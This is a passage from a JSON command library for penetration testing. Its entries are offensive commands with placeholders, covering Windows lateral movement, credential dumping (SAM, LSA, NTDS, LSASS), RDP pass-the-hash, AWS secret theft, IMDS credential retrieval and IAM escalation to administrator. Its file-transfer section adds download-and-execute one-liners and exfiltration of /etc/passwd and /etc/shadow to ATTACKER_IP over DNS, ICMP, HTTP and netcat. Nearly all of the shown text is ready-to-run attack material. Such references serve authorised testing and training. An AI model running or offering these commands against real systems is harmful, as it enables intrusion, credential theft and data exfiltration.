              "schtasks /run /s <TARGET_IP> /u <USER> /p <PASS> /tn \"TaskName\"",
              "schtasks /delete /s <TARGET_IP> /u <USER> /p <PASS> /tn \"TaskName\" /f"
            ],
            "tags": [
              "advanced"
            ],
            "desc": "Create, run, and clean up a remote scheduled task"
          },
          {
            "title": "WMIC Remote Process Create",
            "cmd": "wmic /node:<TARGET_IP> /user:<USER> /password:<PASS> process call create \"cmd.exe /c <COMMAND>\"",
            "tags": [
              "tool"
            ],
            "desc": "Execute a remote process via WMI command line"
          },
          {
            "title": "CrackMapExec Command Exec",
            "cmd": "crackmapexec smb <TARGET_IP> -u <USER> -p '<PASS>' -d <DOMAIN> -x 'whoami'",
            "tags": [
              "essential"
            ],
            "desc": "Execute command via SMB with CrackMapExec"
          },
          {
            "title": "CrackMapExec PowerShell Exec",
            "cmd": "crackmapexec smb <TARGET_IP> -u <USER> -p '<PASS>' -d <DOMAIN> -X 'Get-Process'",
            "tags": [
              "essential"
            ],
            "desc": "Execute PowerShell command via SMB with CME"
          },
          {
            "title": "CrackMapExec Dump SAM",
            "cmd": "crackmapexec smb <TARGET_IP> -u <USER> -p '<PASS>' -d <DOMAIN> --sam",
            "tags": [
              "essential"
            ],
            "desc": "Dump local SAM hashes from target via CME"
          },
          {
            "title": "CrackMapExec Dump LSA",
            "cmd": "crackmapexec smb <TARGET_IP> -u <USER> -p '<PASS>' -d <DOMAIN> --lsa",
            "tags": [
              "tool"
            ],
            "desc": "Dump LSA secrets from target via CME"
          },
          {
            "title": "CrackMapExec Dump NTDS",
            "cmd": "crackmapexec smb <DC_IP> -u <USER> -p '<PASS>' -d <DOMAIN> --ntds",
            "tags": [
              "essential"
            ],
            "desc": "Dump all domain hashes from NTDS.dit via CME"
          },
          {
            "title": "Runas with Network Credentials",
            "cmd": "runas /netonly /user:<DOMAIN>\\<USER> cmd.exe",
            "tags": [
              "tool"
            ],
            "desc": "Spawn cmd.exe with alternate network credentials",
            "note": "Only affects network authentication, not local"
          },
          {
            "title": "SharpRDP Remote Desktop Exec",
            "cmd": "SharpRDP.exe computername=<TARGET_IP> command=\"cmd.exe /c <COMMAND>\" username=<DOMAIN>\\<USER> password=<PASS>",
            "tags": [
              "advanced"
            ],
            "desc": "Execute commands via RDP protocol without full GUI session"
          }
        ]
      },
      {
        "name": "RDP Access",
        "commands": [
          {
            "title": "xfreerdp (Password)",
            "cmd": "xfreerdp /v:<TARGET_IP> /u:<USER> /p:'<PASS>' /d:<DOMAIN> /dynamic-resolution +clipboard",
            "tags": [
              "essential"
            ],
            "desc": "Connect via RDP with xfreerdp"
          },
          {
            "title": "xfreerdp (Hash — Restricted Admin)",
            "cmd": "xfreerdp /v:<TARGET_IP> /u:<USER> /pth:<NTLM_HASH> /d:<DOMAIN> /dynamic-resolution",
            "tags": [
              "advanced"
            ],
            "desc": "RDP Pass the Hash via Restricted Admin mode"
          },
          {
            "title": "xfreerdp with Drive Sharing",
            "cmd": "xfreerdp /v:<TARGET_IP> /u:<USER> /p:'<PASS>' /d:<DOMAIN> /drive:share,/tmp/share",
            "tags": [
              "tool"
            ],
            "desc": "RDP connection with a shared local directory"
          },
          {
            "title": "rdesktop",
            "cmd": "rdesktop -u <USER> -p '<PASS>' -d <DOMAIN> <TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc": "Connect via RDP with rdesktop"
          },
          {
            "title": "Enable RDP Remotely",
            "cmd": "crackmapexec smb <TARGET_IP> -u <USER> -p '<PASS>' -M rdp -o ACTION=enable",
            "tags": [
              "advanced"
            ],
            "desc": "Enable RDP on a remote host via CrackMapExec"
          },
          {
            "title": "xfreerdp with Certificate Ignore",
            "cmd": "xfreerdp /v:<TARGET_IP> /u:<USER> /p:'<PASS>' /cert-ignore /dynamic-resolution +clipboard",
            "tags": [
              "essential"
            ],
            "desc": "RDP ignoring certificate warnings"
          },
          {
            "title": "RDP Pass-the-Hash Check",
            "cmd": "crackmapexec rdp <TARGET_IP> -u <USER> -H <NTLM_HASH> -d <DOMAIN>",
            "tags": [
              "tool"
            ],
            "desc": "Test if RDP PtH via Restricted Admin is possible"
          }
        ]
      },
      {
        "name": "File Shares & Data Collection",
        "commands": [
          {
            "title": "Map Network Share",
            "cmd": "net use Z: \\\\<TARGET_IP>\\<SHARE> /user:<DOMAIN>\\<USER> <PASS>",
            "tags": [
              "essential"
            ],
            "desc": "Map a network share to a drive letter"
          },
          {
            "title": "List Remote Shares",
            "cmd": "net view \\\\<TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc": "List available shares on a remote host"
          },
          {
            "title": "Access Share via smbclient",
            "cmd": "smbclient //<TARGET_IP>/<SHARE> -U '<DOMAIN>/<USER>%<PASS>'",
            "tags": [
              "essential"
            ],
            "desc": "Interactive SMB client to browse and transfer files"
          },
          {
            "title": "CME Spider Shares",
            "cmd": "crackmapexec smb <TARGET_IP> -u <USER> -p '<PASS>' -d <DOMAIN> --spider C$ --depth 3 --pattern txt,xml,config,ini,ps1",
            "tags": [
              "tool"
            ],
            "desc": "Spider remote shares for interesting files"
          },
          {
            "title": "Impacket SMBClient",
            "cmd": "impacket-smbclient '<DOMAIN>/<USER>:<PASS>'@<TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc": "Interactive SMB client via impacket"
          },
          {
            "title": "Copy File via SMB",
            "cmd": "copy \\\\<TARGET_IP>\\C$\\Windows\\Temp\\output.txt C:\\Temp\\",
            "tags": [
              "tool"
            ],
            "desc": "Copy files from remote share via Windows copy command"
          },
          {
            "title": "CME lsassy",
            "desc": "Dump LSASS remotely",
            "cmd": "crackmapexec smb <TARGET_IP> -u <USER> -p '<PASS>' -M lsassy",
            "tags": [
              "essential"
            ]
          }
        ]
      }
    ]
  },
  {
    "id": "cloud-aws",
    "name": "AWS Cloud Security Testing",
    "icon": "☁️",
    "description": "Enumerate and exploit AWS cloud services, IAM, S3, EC2, and more",
    "subcategories": [
      {
        "name": "Credential Configuration",
        "commands": [
          {
            "title": "Configure AWS CLI",
            "cmd": "aws configure",
            "tags": [
              "essential"
            ],
            "desc": "Set up AWS access key, secret key, region, and output format"
          },
          {
            "title": "Set AWS Env Variables",
            "cmds": [
              "export AWS_ACCESS_KEY_ID='<ACCESS_KEY>'",
              "export AWS_SECRET_ACCESS_KEY='<SECRET_KEY>'",
              "export AWS_DEFAULT_REGION='us-east-1'"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Set AWS credentials via environment variables"
          },
          {
            "title": "Set Session Token",
            "cmd": "export AWS_SESSION_TOKEN='<SESSION_TOKEN>'",
            "tags": [
              "tool"
            ],
            "desc": "Set temporary session token for assumed roles"
          },
          {
            "title": "Verify Current Identity",
            "cmd": "aws sts get-caller-identity",
            "tags": [
              "essential"
            ],
            "desc": "Show the current AWS identity (account, ARN, user ID)"
          },
          {
            "title": "Use Specific Profile",
            "cmd": "aws sts get-caller-identity --profile <PROFILE_NAME>",
            "tags": [
              "tool"
            ],
            "desc": "Verify identity for a specific named profile"
          },
          {
            "title": "Assume IAM Role",
            "cmd": "aws sts assume-role --role-arn arn:aws:iam::<ACCOUNT_ID>:role/<ROLE_NAME> --role-session-name pentest",
            "tags": [
              "essential"
            ],
            "desc": "Assume an IAM role and get temporary credentials"
          }
        ]
      },
      {
        "name": "IAM Reconnaissance",
        "commands": [
          {
            "title": "List IAM Users",
            "cmd": "aws iam list-users",
            "tags": [
              "essential"
            ],
            "desc": "Enumerate all IAM users in the account"
          },
          {
            "title": "List IAM Roles",
            "cmd": "aws iam list-roles",
            "tags": [
              "essential"
            ],
            "desc": "Enumerate all IAM roles in the account"
          },
          {
            "title": "List IAM Groups",
            "cmd": "aws iam list-groups",
            "tags": [
              "essential"
            ],
            "desc": "Enumerate all IAM groups in the account"
          },
          {
            "title": "List Managed Policies",
            "cmd": "aws iam list-policies --only-attached",
            "tags": [
              "essential"
            ],
            "desc": "List all attached managed policies"
          },
          {
            "title": "Get User Inline Policy",
            "cmd": "aws iam get-user-policy --user-name <USER> --policy-name <POLICY_NAME>",
            "tags": [
              "tool"
            ],
            "desc": "Retrieve the contents of an inline user policy"
          },
          {
            "title": "List Attached User Policies",
            "cmd": "aws iam list-attached-user-policies --user-name <USER>",
            "tags": [
              "essential"
            ],
            "desc": "List managed policies attached to a specific user"
          },
          {
            "title": "List User Inline Policies",
            "cmd": "aws iam list-user-policies --user-name <USER>",
            "tags": [
              "tool"
            ],
            "desc": "List inline policies for a specific user"
          },
          {
            "title": "Get Policy Version Detail",
            "cmd": "aws iam get-policy-version --policy-arn <POLICY_ARN> --version-id v1",
            "tags": [
              "tool"
            ],
            "desc": "View the actual permissions in a managed policy version"
          },
          {
            "title": "List Group Policies",
            "cmd": "aws iam list-attached-group-policies --group-name <GROUP>",
            "tags": [
              "tool"
            ],
            "desc": "List managed policies attached to a group"
          },
          {
            "title": "List Role Policies",
            "cmd": "aws iam list-attached-role-policies --role-name <ROLE>",
            "tags": [
              "tool"
            ],
            "desc": "List managed policies attached to a role"
          },
          {
            "title": "Get Access Key Info",
            "cmd": "aws iam list-access-keys --user-name <USER>",
            "tags": [
              "tool"
            ],
            "desc": "List access keys for a user"
          },
          {
            "title": "Enumerate-IAM Script",
            "cmd": "python3 enumerate-iam.py --access-key <ACCESS_KEY> --secret-key <SECRET_KEY>",
            "tags": [
              "essential"
            ],
            "desc": "Brute force API permissions for the current identity"
          }
        ]
      },
      {
        "name": "Storage & Compute Enumeration",
        "commands": [
          {
            "title": "List S3 Buckets",
            "cmd": "aws s3 ls",
            "tags": [
              "essential"
            ],
            "desc": "List all S3 buckets in the account"
          },
          {
            "title": "List S3 Bucket Contents",
            "cmd": "aws s3 ls s3://<BUCKET_NAME>/ --recursive",
            "tags": [
              "essential"
            ],
            "desc": "Recursively list all objects in a bucket"
          },
          {
            "title": "Download S3 Object",
            "cmd": "aws s3 cp s3://<BUCKET_NAME>/<KEY> ./loot/",
            "tags": [
              "essential"
            ],
            "desc": "Download a file from S3"
          },
          {
            "title": "Sync S3 Bucket",
            "cmd": "aws s3 sync s3://<BUCKET_NAME>/ ./loot/<BUCKET_NAME>/",
            "tags": [
              "tool"
            ],
            "desc": "Download entire bucket contents"
          },
          {
            "title": "Public S3 Access (No Auth)",
            "cmd": "aws s3 ls s3://<BUCKET_NAME>/ --no-sign-request",
            "tags": [
              "essential"
            ],
            "desc": "List bucket contents without authentication"
          },
          {
            "title": "Get Bucket ACL",
            "cmd": "aws s3api get-bucket-acl --bucket <BUCKET_NAME>",
            "tags": [
              "tool"
            ],
            "desc": "Check the access control list of a bucket"
          },
          {
            "title": "Get Bucket Policy",
            "cmd": "aws s3api get-bucket-policy --bucket <BUCKET_NAME>",
            "tags": [
              "tool"
            ],
            "desc": "Retrieve the bucket policy JSON"
          },
          {
            "title": "Check Bucket Website",
            "cmd": "aws s3api get-bucket-website --bucket <BUCKET_NAME>",
            "tags": [
              "tool"
            ],
            "desc": "Check if bucket is configured as a static website"
          },
          {
            "title": "Describe EC2 Instances",
            "cmd": "aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,State.Name,PublicIpAddress,PrivateIpAddress,Tags[?Key==`Name`].Value|[0]]' --output table",
            "tags": [
              "essential"
            ],
            "desc": "List all EC2 instances with key details"
          },
          {
            "title": "Describe Security Groups",
            "cmd": "aws ec2 describe-security-groups --query 'SecurityGroups[*].[GroupId,GroupName,IpPermissions]'",
            "tags": [
              "essential"
            ],
            "desc": "Enumerate security group rules for open ports"
          },
          {
            "title": "Describe VPCs",
            "cmd": "aws ec2 describe-vpcs",
            "tags": [
              "tool"
            ],
            "desc": "List all VPCs in the region"
          },
          {
            "title": "Describe Subnets",
            "cmd": "aws ec2 describe-subnets --query 'Subnets[*].[SubnetId,CidrBlock,AvailabilityZone,Tags[?Key==`Name`].Value|[0]]' --output table",
            "tags": [
              "tool"
            ],
            "desc": "List all subnets with CIDR info"
          },
          {
            "title": "Describe Snapshots (Own)",
            "cmd": "aws ec2 describe-snapshots --owner-ids self",
            "tags": [
              "essential"
            ],
            "desc": "List EBS snapshots owned by current account"
          },
          {
            "title": "List Lambda Functions",
            "cmd": "aws lambda list-functions --query 'Functions[*].[FunctionName,Runtime,Role]' --output table",
            "tags": [
              "essential"
            ],
            "desc": "List all Lambda functions with runtime info"
          },
          {
            "title": "Get Lambda Function Code",
            "cmd": "aws lambda get-function --function-name <FUNCTION_NAME>",
            "tags": [
              "essential"
            ],
            "desc": "Get Lambda function details and download code URL"
          },
          {
            "title": "Get Lambda Policy",
            "cmd": "aws lambda get-policy --function-name <FUNCTION_NAME>",
            "tags": [
              "tool"
            ],
            "desc": "Get resource-based policy for a Lambda function"
          },
          {
            "title": "Describe RDS Instances",
            "cmd": "aws rds describe-db-instances --query 'DBInstances[*].[DBInstanceIdentifier,Engine,Endpoint.Address,PubliclyAccessible]' --output table",
            "tags": [
              "essential"
            ],
            "desc": "List RDS database instances"
          },
          {
            "title": "List EKS Clusters",
            "cmd": "aws eks list-clusters",
            "tags": [
              "tool"
            ],
            "desc": "List all EKS Kubernetes clusters"
          },
          {
            "title": "List ECR Images",
            "cmd": "aws ecr list-images --repository-name <REPO_NAME>",
            "tags": [
              "tool"
            ],
            "desc": "List images in an ECR container registry"
          },
          {
            "title": "EC2 Snapshots",
            "desc": "Find snapshots with secrets",
            "cmd": "aws ec2 describe-snapshots --owner-ids self --output table",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "EC2 User Data",
            "desc": "Check user data for secrets",
            "cmd": "aws ec2 describe-instance-attribute --instance-id <ID> --attribute userData --query 'UserData.Value' | base64 -d",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "DynamoDB Scan",
            "desc": "Dump table contents",
            "cmd": "aws dynamodb scan --table-name <TABLE>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "CloudWatch Logs",
            "desc": "Enumerate log groups",
            "cmd": "aws logs describe-log-groups",
            "tags": [
              "tool"
            ]
          }
        ]
      },
      {
        "name": "Secrets & Metadata",
        "commands": [
          {
            "title": "List Secrets Manager Secrets",
            "cmd": "aws secretsmanager list-secrets",
            "tags": [
              "essential"
            ],
            "desc": "List all secrets in AWS Secrets Manager"
          },
          {
            "title": "Get Secret Value",
            "cmd": "aws secretsmanager get-secret-value --secret-id <SECRET_NAME>",
            "tags": [
              "essential"
            ],
            "desc": "Retrieve the actual secret value"
          },
          {
            "title": "List SSM Parameters",
            "cmd": "aws ssm describe-parameters",
            "tags": [
              "essential"
            ],
            "desc": "List all SSM Parameter Store entries"
          },
          {
            "title": "Get SSM Parameter (Decrypted)",
            "cmd": "aws ssm get-parameter --name <PARAM_NAME> --with-decryption",
            "tags": [
              "essential"
            ],
            "desc": "Get SSM parameter value including SecureString decryption"
          },
          {
            "title": "IMDSv1 — Get Credentials",
            "cmd": "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>",
            "tags": [
              "essential"
            ],
            "desc": "Retrieve IAM role credentials from EC2 instance metadata v1",
            "note": "Only works from within an EC2 instance"
          },
          {
            "title": "IMDSv2 — Get Token + Credentials",
            "cmds": [
              "TOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600')",
              "curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Retrieve credentials from IMDSv2 (token required)"
          },
          {
            "title": "IMDS — List Available Roles",
            "cmd": "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "tags": [
              "tool"
            ],
            "desc": "Discover IAM roles available on the instance"
          },
          {
            "title": "EC2 User Data",
            "cmd": "aws ec2 describe-instance-attribute --instance-id <INSTANCE_ID> --attribute userData --query 'UserData.Value' --output text | base64 -d",
            "tags": [
              "essential"
            ],
            "desc": "Retrieve and decode EC2 instance user data (may contain secrets)"
          }
        ]
      },
      {
        "name": "Privilege Escalation",
        "commands": [
          {
            "title": "Create Access Key for User",
            "cmd": "aws iam create-access-key --user-name <USER>",
            "tags": [
              "essential"
            ],
            "desc": "Create new access keys for a user (requires iam:CreateAccessKey)"
          },
          {
            "title": "Attach Admin Policy to User",
            "cmd": "aws iam attach-user-policy --user-name <USER> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
            "tags": [
              "essential"
            ],
            "desc": "Attach the AdministratorAccess policy to a user"
          },
          {
            "title": "Put Inline Admin Policy",
            "cmd": "aws iam put-user-policy --user-name <USER> --policy-name AdminPolicy --policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}]}'",
            "tags": [
              "advanced"
            ],
            "desc": "Add an inline policy granting full access to a user"
          },
          {
            "title": "Add User to Admin Group",
            "cmd": "aws iam add-user-to-group --user-name <USER> --group-name <ADMIN_GROUP>",
            "tags": [
              "tool"
            ],
            "desc": "Add user to a group with elevated permissions"
          },
          {
            "title": "Update Lambda Code for Escalation",
            "cmd": "aws lambda update-function-code --function-name <FUNCTION_NAME> --zip-file fileb://malicious.zip",
            "tags": [
              "advanced"
            ],
            "desc": "Replace Lambda function code to escalate via its IAM role"
          },
          {
            "title": "Create Login Profile",
            "cmd": "aws iam create-login-profile --user-name <USER> --password '<PASS>' --no-password-reset-required",
            "tags": [
              "advanced"
            ],
            "desc": "Create console login for a user that only had API access"
          }
        ]
      },
      {
        "name": "Automated Tools",
        "commands": [
          {
            "title": "Pacu — Start Framework",
            "cmd": "pacu",
            "tags": [
              "essential"
            ],
            "desc": "Launch Pacu AWS exploitation framework"
          },
          {
            "title": "Pacu — IAM Enum",
            "cmd": "run iam__enum_permissions",
            "tags": [
              "essential"
            ],
            "desc": "Enumerate permissions for the current Pacu session identity"
          },
          {
            "title": "Pacu — Privesc Scan",
            "cmd": "run iam__privesc_scan",
            "tags": [
              "essential"
            ],
            "desc": "Scan for privilege escalation paths in IAM"
          },
          {
            "title": "Pacu — Enum EC2",
            "cmd": "run ec2__enum",
            "tags": [
              "tool"
            ],
            "desc": "Enumerate EC2 instances and related resources"
          },
          {
            "title": "Pacu — Enum S3",
            "cmd": "run s3__enum",
            "tags": [
              "tool"
            ],
            "desc": "Enumerate S3 buckets and their permissions"
          },
          {
            "title": "Pacu — Enum Lambda",
            "cmd": "run lambda__enum",
            "tags": [
              "tool"
            ],
            "desc": "Enumerate Lambda functions and configurations"
          },
          {
            "title": "ScoutSuite AWS Audit",
            "cmd": "scout aws --profile <PROFILE_NAME>",
            "tags": [
              "essential"
            ],
            "desc": "Run comprehensive AWS security audit with ScoutSuite"
          },
          {
            "title": "Prowler AWS Audit",
            "cmd": "prowler aws",
            "tags": [
              "essential"
            ],
            "desc": "Run CIS benchmark and security best practices audit"
          },
          {
            "title": "S3Scanner",
            "cmd": "s3scanner scan --bucket-file bucket_names.txt",
            "tags": [
              "tool"
            ],
            "desc": "Scan for misconfigured and public S3 buckets"
          },
          {
            "title": "CloudMapper Visualization",
            "cmd": "python3 cloudmapper.py collect --config config.json --account <ACCOUNT_NAME> && python3 cloudmapper.py prepare --config config.json --account <ACCOUNT_NAME>",
            "tags": [
              "advanced"
            ],
            "desc": "Collect and visualize AWS network infrastructure"
          }
        ]
      }
    ]
  },
  {
    "id": "file-ops",
    "name": "File Transfer Arsenal",
    "icon": "📁",
    "description": "Techniques for transferring files to and from targets across different protocols",
    "subcategories": [
      {
        "name": "Attacker-Side Hosting",
        "commands": [
          {
            "title": "Python3 HTTP Server",
            "cmd": "python3 -m http.server 80",
            "tags": [
              "essential"
            ],
            "desc": "Start a simple HTTP server on port 80"
          },
          {
            "title": "Python2 HTTP Server",
            "cmd": "python -m SimpleHTTPServer 80",
            "tags": [
              "essential"
            ],
            "desc": "Start a Python 2 HTTP server on port 80"
          },
          {
            "title": "PHP Built-in Server",
            "cmd": "php -S 0.0.0.0:80",
            "tags": [
              "tool"
            ],
            "desc": "Start a PHP development server for hosting files"
          },
          {
            "title": "Ruby HTTP Server",
            "cmd": "ruby -run -e httpd . -p 80",
            "tags": [
              "tool"
            ],
            "desc": "Start a Ruby HTTP server in the current directory"
          },
          {
            "title": "Busybox HTTP Server",
            "cmd": "busybox httpd -f -p 80",
            "tags": [
              "tool"
            ],
            "desc": "Lightweight HTTP server via busybox"
          },
          {
            "title": "Python Upload Server",
            "cmd": "python3 -m uploadserver 443 --server-certificate /path/to/cert.pem",
            "tags": [
              "tool"
            ],
            "desc": "HTTP upload server for receiving files from target"
          },
          {
            "title": "Impacket SMB Server (No Auth)",
            "cmd": "impacket-smbserver share $(pwd) -smb2support",
            "tags": [
              "essential"
            ],
            "desc": "Start an SMB server sharing the current directory"
          },
          {
            "title": "Impacket SMB Server (With Auth)",
            "cmd": "impacket-smbserver share $(pwd) -smb2support -username <USER> -password <PASS>",
            "tags": [
              "essential"
            ],
            "desc": "SMB server with authentication required"
          },
          {
            "title": "FTP Server (pyftpdlib)",
            "cmd": "python3 -m pyftpdlib -p 21 -w",
            "tags": [
              "tool"
            ],
            "desc": "Start a writable FTP server on port 21"
          },
          {
            "title": "TFTP Server",
            "cmd": "sudo atftpd --daemon --port 69 /tftp",
            "tags": [
              "tool"
            ],
            "desc": "Start a TFTP server for simple file transfers"
          },
          {
            "title": "Netcat Listener (Receive File)",
            "cmd": "nc -lvnp <PORT> > received_file",
            "tags": [
              "essential"
            ],
            "desc": "Listen for incoming file transfer via netcat"
          },
          {
            "title": "Upload Server",
            "desc": "HTTP upload server",
            "cmd": "python3 -m uploadserver 80",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "WebDAV Server",
            "desc": "Host WebDAV",
            "cmd": "wsgidav --host 0.0.0.0 --port 80 --root /tmp/webdav --auth anonymous",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "FTP Server",
            "desc": "Quick FTP server",
            "cmd": "python3 -m pyftpdlib -w -p 21 -u <USER> -P <PASS>",
            "tags": [
              "tool"
            ]
          }
        ]
      },
      {
        "name": "Linux Target Downloads",
        "commands": [
          {
            "title": "wget Download",
            "cmd": "wget http://<ATTACKER_IP>/file -O /tmp/file",
            "tags": [
              "essential"
            ],
            "desc": "Download file using wget"
          },
          {
            "title": "curl Download",
            "cmd": "curl http://<ATTACKER_IP>/file -o /tmp/file",
            "tags": [
              "essential"
            ],
            "desc": "Download file using curl"
          },
          {
            "title": "curl Execute in Memory",
            "cmd": "curl http://<ATTACKER_IP>/script.sh | bash",
            "tags": [
              "essential"
            ],
            "desc": "Download and execute script without writing to disk"
          },
          {
            "title": "SCP Download",
            "cmd": "scp <USER>@<ATTACKER_IP>:/path/to/file /tmp/file",
            "tags": [
              "essential"
            ],
            "desc": "Secure copy from attacker machine"
          },
          {
            "title": "SCP Upload to Attacker",
            "cmd": "scp /path/to/file <USER>@<ATTACKER_IP>:/tmp/loot/",
            "tags": [
              "essential"
            ],
            "desc": "Upload file from target to attacker"
          },
          {
            "title": "SFTP Transfer",
            "cmds": [
              "sftp <USER>@<ATTACKER_IP>",
              "get /path/to/file",
              "put /local/file /remote/path/"
            ],
            "tags": [
              "tool"
            ],
            "desc": "Interactive SFTP session for file transfers"
          },
          {
            "title": "rsync Transfer",
            "cmd": "rsync -avz <USER>@<ATTACKER_IP>:/path/to/file /tmp/file",
            "tags": [
              "tool"
            ],
            "desc": "Efficient file synchronization via rsync"
          },
          {
            "title": "Netcat Send File",
            "cmd": "nc <ATTACKER_IP> <PORT> < /path/to/file",
            "tags": [
              "essential"
            ],
            "desc": "Send a file to the attacker via netcat"
          },
          {
            "title": "Socat File Transfer",
            "cmd": "socat TCP4:<ATTACKER_IP>:<PORT> file:/tmp/file,create",
            "tags": [
              "tool"
            ],
            "desc": "Download file via socat"
          },
          {
            "title": "Bash /dev/tcp Download",
            "cmd": "cat < /dev/tcp/<ATTACKER_IP>/<PORT> > /tmp/file",
            "tags": [
              "advanced"
            ],
            "desc": "Download file using bash built-in /dev/tcp (no external tools)"
          },
          {
            "title": "Wget Recursive Download",
            "cmd": "wget -r -np http://<ATTACKER_IP>/share/",
            "tags": [
              "tool"
            ],
            "desc": "Recursively download directory contents"
          }
        ]
      },
      {
        "name": "Windows Target Downloads",
        "commands": [
          {
            "title": "certutil Download",
            "cmd": "certutil -urlcache -split -f http://<ATTACKER_IP>/file.exe C:\\Temp\\file.exe",
            "tags": [
              "essential"
            ],
            "desc": "Download file via certutil (LOLBin)"
          },
          {
            "title": "PowerShell DownloadFile",
            "cmd": "powershell -c \"(New-Object System.Net.WebClient).DownloadFile('http://<ATTACKER_IP>/file.exe','C:\\Temp\\file.exe')\"",
            "tags": [
              "essential"
            ],
            "desc": "Download file via .NET WebClient"
          },
          {
            "title": "PowerShell Invoke-WebRequest",
            "cmd": "powershell -c \"Invoke-WebRequest -Uri http://<ATTACKER_IP>/file.exe -OutFile C:\\Temp\\file.exe\"",
            "tags": [
              "essential"
            ],
            "desc": "Download file via Invoke-WebRequest (IWR)"
          },
          {
            "title": "PowerShell IEX (In-Memory)",
            "cmd": "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/script.ps1')\"",
            "tags": [
              "essential"
            ],
            "desc": "Download and execute PowerShell script in memory"
          },
          {
            "title": "BitsAdmin Download",
            "cmd": "bitsadmin /transfer job /download /priority high http://<ATTACKER_IP>/file.exe C:\\Temp\\file.exe",
            "tags": [
              "essential"
            ],
            "desc": "Download file via BITS service"
          },
          {
            "title": "Start-BitsTransfer",
            "cmd": "powershell -c \"Start-BitsTransfer -Source http://<ATTACKER_IP>/file.exe -Destination C:\\Temp\\file.exe\"",
            "tags": [
              "tool"
            ],
            "desc": "Download file via PowerShell BITS cmdlet"
          },
          {
            "title": "Copy from SMB Share",
            "cmd": "copy \\\\<ATTACKER_IP>\\share\\file.exe C:\\Temp\\file.exe",
            "tags": [
              "essential"
            ],
            "desc": "Copy file from attacker's SMB share"
          },
          {
            "title": "Net Use SMB Mount",
            "cmds": [
              "net use Z: \\\\<ATTACKER_IP>\\share /user:<USER> <PASS>",
              "copy Z:\\file.exe C:\\Temp\\file.exe",
              "net use Z: /delete"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Mount SMB share, copy file, and clean up"
          },
          {
            "title": "PowerShell Upload (POST)",
            "cmd": "powershell -c \"Invoke-WebRequest -Uri http://<ATTACKER_IP>/upload -Method POST -InFile C:\\Temp\\file.txt\"",
            "tags": [
              "tool"
            ],
            "desc": "Upload file from target to attacker via HTTP POST"
          },
          {
            "title": "Expand CAB File Transfer",
            "cmd": "expand \\\\<ATTACKER_IP>\\share\\file.cab C:\\Temp\\file.exe",
            "tags": [
              "advanced"
            ],
            "desc": "Use expand.exe to copy from remote share (LOLBin)"
          },
          {
            "title": "Esentutl Copy",
            "cmd": "esentutl.exe /y \\\\<ATTACKER_IP>\\share\\file.exe /d C:\\Temp\\file.exe /o",
            "tags": [
              "advanced"
            ],
            "desc": "Use esentutl.exe for file copy (LOLBin)"
          },
          {
            "title": "MakeCab + Expand",
            "cmds": [
              "makecab C:\\Temp\\secret.txt C:\\Temp\\secret.cab",
              "# Transfer secret.cab to attacker",
              "expand secret.cab secret.txt"
            ],
            "tags": [
              "advanced"
            ],
            "desc": "Compress and transfer via CAB archive"
          },
          {
            "title": "Certutil Base64 Encode",
            "cmds": [
              "certutil -encode C:\\Temp\\file.exe C:\\Temp\\file.b64",
              "type C:\\Temp\\file.b64",
              "# On attacker: decode the base64"
            ],
            "tags": [
              "advanced"
            ],
            "desc": "Encode file as base64 for text-based exfil (LOLBin)"
          }
        ]
      },
      {
        "name": "Exfiltration Techniques",
        "commands": [
          {
            "title": "Exfil via DNS (base64 chunks)",
            "cmd": "cat /etc/passwd | base64 -w0 | fold -w 60 | while read line; do nslookup $line.<ATTACKER_DOMAIN>; done",
            "tags": [
              "advanced"
            ],
            "desc": "Exfiltrate data through DNS queries"
          },
          {
            "title": "Exfil via ICMP",
            "cmd": "cat /etc/passwd | xxd -p -c 16 | while read line; do ping -c 1 -p $line <ATTACKER_IP>; done",
            "tags": [
              "advanced"
            ],
            "desc": "Exfiltrate data embedded in ICMP packets"
          },
          {
            "title": "Exfil via curl POST",
            "cmd": "curl -X POST -d @/etc/shadow http://<ATTACKER_IP>:<PORT>/exfil",
            "tags": [
              "tool"
            ],
            "desc": "Exfiltrate file contents via HTTP POST"
          },
          {
            "title": "Exfil via Netcat",
            "cmd": "tar czf - /path/to/data/ | nc <ATTACKER_IP> <PORT>",
            "tags": [
              "essential"
            ],
            "desc": "Compress and exfiltrate directory via netcat"
          },
          {
            "title": "Exfil via OpenSSL Encrypted",
            "cmds": [
              "tar czf - /path/to/data/ | openssl enc -aes-256-cbc -pbkdf2 -pass pass:<PASSWORD> | nc <ATTACKER_IP> <PORT>",
              "# On attacker: nc -lvnp <PORT> | openssl enc -d -aes-256-cbc -pbkdf2 -pass pass:<PASSWORD> | tar xzf -"
            ],
            "tags": [
              "advanced"
            ],
            "desc": "Encrypted exfiltration via OpenSSL and netcat"
          }
        ]
      },
      {
        "name": "Encoding & Steganography Transfers",
        "commands": [
          {
            "title": "Base64 Encode (Linux)",
            "cmd": "base64 -w0 file.bin > file.b64",
            "tags": [
              "essential"
            ],
            "desc": "Encode a file to base64 for text-based transfer"
          },
          {
            "title": "Base64 Decode (Linux)",
            "cmd": "base64 -d file.b64 > file.bin",
            "tags": [
              "essential"
            ],
            "desc": "Decode a base64 encoded file"
          },
          {
            "title": "Base64 Encode (PowerShell)",
            "cmd": "powershell -c \"[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Temp\\file.exe'))\"",
            "tags": [
              "essential"
            ],
            "desc": "Base64 encode a file on Windows"
          },
          {
